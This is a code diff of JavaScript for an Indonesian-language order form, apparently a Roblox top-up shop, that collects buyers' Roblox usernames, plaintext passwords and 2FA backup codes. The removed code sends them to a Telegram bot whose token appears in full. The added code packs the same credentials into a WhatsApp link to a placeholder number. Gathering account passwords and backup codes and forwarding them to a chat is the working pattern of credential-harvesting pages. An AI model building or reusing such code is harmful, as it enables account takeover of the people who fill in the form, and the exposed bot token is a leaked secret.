@@ -792,91 +792,88 @@ document.addEventListener('DOMContentLoaded', function(){
   document.getElementById('btnAddItem')?.addEventListener('click', adminAddItem);
   document.getElementById('btnSaveAll')?.addEventListener('click', adminSaveAll);
 
-  // =======================
-  // KIRIM TELEGRAM + PAYMENT
-  // =======================
-  document.getElementById("btnWa")?.addEventListener("click", function() {
+// =======================
+// KIRIM WHATSAPP + PAYMENT
+// =======================
+document.getElementById("btnWa")?.addEventListener("click", function() {
 
-    if (!storeOpen) {
-      showPopup('Notification','CLOSE','Mohon maaf, saat ini kamu belum bisa melakukan pemesanan. Silahkan kembali lagi nanti.');
+  if (!storeOpen) {
+    showPopup(
+      'Notification',
+      'CLOSE',
+      'Mohon maaf, saat ini kamu belum bisa melakukan pemesanan. Silahkan kembali lagi nanti.'
+    );
+    return;
+  }
+
+  const form = document.getElementById("orderForm");
+  const inputs = form.querySelectorAll("input[required], select[required]");
+
+  for (const input of inputs) {
+    if (!String(input.value || '').trim()) {
+      showPopup('Notification', 'Oops', 'Harap isi semua kolom yang wajib diisi!');
+      try { input.focus(); } catch(e){}
+      return;
+    }
+  }
+
+  let username = document.getElementById("username").value.trim();
+  let password = document.getElementById("password").value.trim();
+  let v2l = document.getElementById("v2l").value;
+  let metodeV2L = document.getElementById("metodeV2L").value;
+  let backupCode = document.getElementById("backupCode").value.trim();
+  let kategori = document.getElementById("kategori").value;
+  let nominal = document.getElementById("nominal").value;
+  let harga = document.getElementById("harga").value;
+
+  if (v2l === "ON") {
+    if (!metodeV2L) {
+      showPopup('Notification', 'Oops', 'Karena V2L aktif, silakan pilih metode V2L.');
+      document.getElementById("metodeV2L").focus();
       return;
     }
 
-    const form = document.getElementById("orderForm");
-
-    const inputs = form.querySelectorAll("input[required], select[required]");
-    for (const input of inputs) {
-      if (!String(input.value || '').trim()) {
-        showPopup('Notification', 'Oops', 'Harap isi semua kolom yang wajib diisi!');
-        try{ input.focus(); }catch(e){}
-        return;
-      }
+    const mustBackup = (kategori === "Basic" || kategori === "Premium");
+    if (mustBackup && metodeV2L !== "Backup Code") {
+      showPopup('Notification', 'Oops', 'Kategori ini wajib menggunakan Backup Code.');
+      document.getElementById("metodeV2L").focus();
+      return;
     }
 
-    let username = document.getElementById("username").value.trim();
-    let password = document.getElementById("password").value.trim();
-    let v2l = document.getElementById("v2l").value;
-    let metodeV2L = document.getElementById("metodeV2L").value;
-    let backupCode = document.getElementById("backupCode").value.trim();
-    let kategori = document.getElementById("kategori").value;
-    let nominal = document.getElementById("nominal").value;
-    let harga = document.getElementById("harga").value;
-
-    if (v2l === "ON") {
-      if (!metodeV2L) {
-        showPopup('Notification', 'Oops', 'Karena V2L aktif, silakan pilih metode V2L.');
-        document.getElementById("metodeV2L").focus();
-        return;
-      }
-
-      const mustBackup = (kategori === "Basic" || kategori === "Premium");
-      if (mustBackup && metodeV2L !== "Backup Code") {
-        showPopup('Notification', 'Oops', 'Kategori ini wajib menggunakan Backup Code.');
-        document.getElementById("metodeV2L").focus();
-        return;
-      }
-
-      if (metodeV2L === "Backup Code" && !backupCode) {
-        showPopup('Notification', 'Oops', 'Mohon masukkan Backup Code.');
-        document.getElementById("backupCode").focus();
-        return;
-      }
+    if (metodeV2L === "Backup Code" && !backupCode) {
+      showPopup('Notification', 'Oops', 'Mohon masukkan Backup Code.');
+      document.getElementById("backupCode").focus();
+      return;
     }
+  }
 
-    const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
-    const chatId = "-1003049680083";
+  // GANTI dengan nomor WhatsApp tujuan
+  // format: 628xxxxxxxxxx (tanpa +, tanpa spasi, tanpa 0 depan)
+  const waNumber = "6281234567890";
 
-    const text =
-      "Pesanan Baru Masuk!\n\n" +
-      "Username Roblox: " + username + "\n" +
-      "Password Roblox: " + password + "\n" +
-      "V2L: " + v2l + (metodeV2L ? " (" + metodeV2L + ")" : "") + (backupCode ? "\nBackup Code: " + backupCode : "") + "\n" +
-      "Kategori: " + kategori + "\n" +
-      "Nominal: " + nominal + "\n" +
-      "Harga: " + harga;
+  const text =
+    "Pesanan Baru Masuk!%0A%0A" +
+    "Username Roblox: " + encodeURIComponent(username) + "%0A" +
+    "Password Roblox: " + encodeURIComponent(password) + "%0A" +
+    "V2L: " + encodeURIComponent(v2l + (metodeV2L ? " (" + metodeV2L + ")" : "")) +
+    (backupCode ? "%0ABackup Code: " + encodeURIComponent(backupCode) : "") + "%0A" +
+    "Kategori: " + encodeURIComponent(kategori) + "%0A" +
+    "Nominal: " + encodeURIComponent(nominal) + "%0A" +
+    "Harga: " + encodeURIComponent(harga);
 
-    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text })
-    })
-    .then(res => {
-      if (res.ok) {
-        const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
-        showPaymentPopup(qrUrl, harga);
+  const waUrl = `https://wa.me/${waNumber}?text=${text}`;
 
-        form.reset();
-        document.getElementById("backupCode_div").classList.add("hidden");
-        document.getElementById("emailNote_div").classList.add("hidden");
-        document.getElementById("metodeV2L_div").classList.add("hidden");
-        document.getElementById("metodeV2L").innerHTML = '';
-      } else {
-        showPopup('Notification', 'Gagal', 'Gagal mengirim ke Telegram. Coba lagi.');
-      }
-    })
-    .catch((error) => {
-      console.error(error);
-      showPopup('Notification', 'Error', 'Terjadi kesalahan saat mengirim ke Telegram.');
-    });
-  });
+  // buka WhatsApp
+  window.open(waUrl, "_blank");
+
+  // tampilkan popup payment
+  const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
+  showPaymentPopup(qrUrl, harga);
+
+  // reset form
+  form.reset();
+  document.getElementById("backupCode_div").classList.add("hidden");
+  document.getElementById("emailNote_div").classList.add("hidden");
+  document.getElementById("metodeV2L_div").classList.add("hidden");
+  document.getElementById("metodeV2L").innerHTML = '';
 });
